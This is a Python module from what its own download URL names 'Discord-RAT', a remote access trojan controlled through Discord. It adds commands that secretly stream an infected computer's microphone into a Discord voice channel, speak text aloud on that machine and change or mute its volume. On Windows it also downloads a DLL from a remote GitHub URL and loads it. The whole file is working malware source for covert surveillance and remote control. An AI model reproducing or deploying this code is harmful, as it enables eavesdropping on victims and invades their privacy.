"""
commands/audio.py - TTS, microphone streaming, and volume control.
"""

import re
import subprocess

import discord
import pyttsx3
import requests
import sounddevice as sd
from discord.ext import commands
from discord.ext.commands import MissingRequiredArgument

from config import IS_WINDOWS, TEMP_DIR, bot
from utils import (
    channel_ids,
    current_time,
    generic_command_error,
    in_correct_channel,
    is_authorized,
    log_message,
    wrong_channel,
)

if IS_WINDOWS:
    from config import CLSCTX_ALL, AudioUtilities, IAudioEndpointVolume


# ── Opus loading ───────────────────────────────────────────────────────────
def _load_opus():
    if IS_WINDOWS:
        import os

        url = (
            "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"
        )
        path = os.path.join(TEMP_DIR, "libopus.dll")
        if not os.path.exists(path):
            with open(path, "wb") as f:
                f.write(requests.get(url).content)
            print(f"{path} downloaded.")
        discord.opus.load_opus(path)
    else:
        if not discord.opus.is_loaded():
            import ctypes.util as _cu

            for lib in [_cu.find_library("opus"), "libopus.so.0", "libopus.so", "opus"]:
                if not lib:
                    continue
                try:
                    discord.opus.load_opus(lib)
                    print(f"Loaded opus: {lib}")
                    break
                except Exception:
                    continue
            if not discord.opus.is_loaded():
                print("WARNING: Could not load libopus, voice will not work.")


_load_opus()


# ── Audio source ───────────────────────────────────────────────────────────
class MicrophonePCM(discord.AudioSource):
    """Streams microphone input via sounddevice as 48kHz/16-bit stereo PCM."""

    def __init__(self, channels=2, rate=48000, chunk=960, device=None):
        self._chunk = chunk
        self._stream = sd.RawInputStream(
            samplerate=rate,
            channels=channels,
            dtype="int16",
            blocksize=chunk,
            device=device,
        )
        self._stream.start()

    def read(self) -> bytes:
        data, _ = self._stream.read(self._chunk)
        return bytes(data)

    def cleanup(self):
        self._stream.stop()
        self._stream.close()


# ── Linux volume helpers (pactl) ───────────────────────────────────────────
def _pactl(*args) -> str:
    return subprocess.run(["pactl"] + list(args), capture_output=True, text=True).stdout


def _linux_get_volume() -> int:
    m = re.search(r"(\d+)%", _pactl("get-sink-volume", "@DEFAULT_SINK@"))
    return int(m.group(1)) if m else 0


def _linux_is_muted() -> bool:
    return "yes" in _pactl("get-sink-mute", "@DEFAULT_SINK@").lower()


def _linux_set_volume(pct: int):
    subprocess.run(["pactl", "set-sink-volume", "@DEFAULT_SINK@", f"{pct}%"])


def _linux_set_mute(mute: bool):
    subprocess.run(["pactl", "set-sink-mute", "@DEFAULT_SINK@", "1" if mute else "0"])


# ── Windows volume helper ──────────────────────────────────────────────────
def _win_get_device():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    return interface.QueryInterface(IAudioEndpointVolume)


# ── Cog ────────────────────────────────────────────────────────────────────
class AudioCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # ── TTS ────────────────────────────────────────────────────────────────
    @commands.command()
    @commands.check(is_authorized)
    async def tts(self, ctx, *, message):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            engine = pyttsx3.init()
            engine.say(message)
            engine.runAndWait()
            await log_message(ctx, f"🔊 **Text-to-Speech message played:** {message}")
        except Exception as e:
            await log_message(
                ctx, f"❌ **Error playing TTS message:** {e}", duration=10
            )

    @tts.error
    async def tts_error(self, ctx, error):
        if isinstance(error, MissingRequiredArgument):
            await log_message(
                ctx, "❌ **Error:** Please provide a message.", duration=10
            )
        else:
            await log_message(ctx, f"❌ **Error:** {error}", duration=10)

    # ── Mic stream ─────────────────────────────────────────────────────────
    @commands.command()
    @commands.check(is_authorized)
    async def mic_stream_start(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        if "voice" not in channel_ids:
            await ctx.send(
                f"`[{current_time()}] Voice channel ID is not set.`", delete_after=10
            )
            return
        vc_channel = discord.utils.get(
            ctx.guild.voice_channels, id=channel_ids["voice"]
        )
        if vc_channel is None:
            await ctx.send(
                f"`[{current_time()}] Voice channel not found.`", delete_after=10
            )
            return
        vc = await vc_channel.connect(self_deaf=True)
        vc.play(MicrophonePCM())
        await ctx.send(
            f"`[{current_time()}] Joined voice channel and streaming microphone in realtime`"
        )
        print(f"[{current_time()}] Started streaming microphone")

    @mic_stream_start.error
    async def mic_stream_start_error(self, ctx, error):
        await generic_command_error(ctx, error)

    @commands.command()
    @commands.check(is_authorized)
    async def mic_stream_stop(self, ctx):
        if ctx.voice_client is None:
            await ctx.send(
                f"`[{current_time()}] Bot is not in a voice channel.`", delete_after=10
            )
            return
        if isinstance(ctx.voice_client.source, MicrophonePCM):
            ctx.voice_client.source.cleanup()
        await ctx.voice_client.disconnect()
        await ctx.send(f"`[{current_time()}] Left voice channel.`", delete_after=10)

    @mic_stream_stop.error
    async def mic_stream_stop_error(self, ctx, error):
        await generic_command_error(ctx, error)

    # ── Volume ─────────────────────────────────────────────────────────────
    @commands.command(name="volume")
    @commands.check(is_authorized)
    async def volume(self, ctx, *args):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return

        if IS_WINDOWS:
            vol = _win_get_device()
            get_vol = lambda: int(vol.GetMasterVolumeLevelScalar() * 100)
            get_mute = lambda: vol.GetMute()
            set_vol = lambda pct: vol.SetMasterVolumeLevelScalar(pct / 100.0, None)
            set_mute = lambda m: vol.SetMute(1 if m else 0, None)
        else:
            get_vol = _linux_get_volume
            get_mute = _linux_is_muted
            set_vol = _linux_set_volume
            set_mute = _linux_set_mute

        if not args:
            mute_status = "Muted 🔇" if get_mute() else "Unmuted 🔊"
            await ctx.send(
                f"🎵 **Audio Device Info:**\n"
                f"Current Volume: {get_vol()}%\nStatus: {mute_status}\n\n"
                f"**Usage:**\n"
                f"`!volume [0-100]` - Set volume\n"
                f"`!volume mute` / `!volume unmute` - Toggle mute"
            )
        elif args[0].isdigit():
            pct = int(args[0])
            if not 0 <= pct <= 100:
                msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
                await msg.delete(delay=10)
                return
            set_vol(pct)
            await ctx.send(f"🔊 **Volume set to {pct}%**")
        elif args[0] == "mute":
            if get_mute():
                msg = await ctx.send("❌ **Error:** Already muted.")
                await msg.delete(delay=10)
                return
            set_mute(True)
            await ctx.send("🔇 **Audio has been muted.**")
        elif args[0] == "unmute":
            if not get_mute():
                msg = await ctx.send("❌ **Error:** Already unmuted.")
                await msg.delete(delay=10)
                return
            set_mute(False)
            await ctx.send("🔊 **Audio has been unmuted.**")
        else:
            msg = await ctx.send("❌ **Error:** Invalid command.")
            await msg.delete(delay=10)


async def setup(bot):
    await bot.add_cog(AudioCommands(bot))
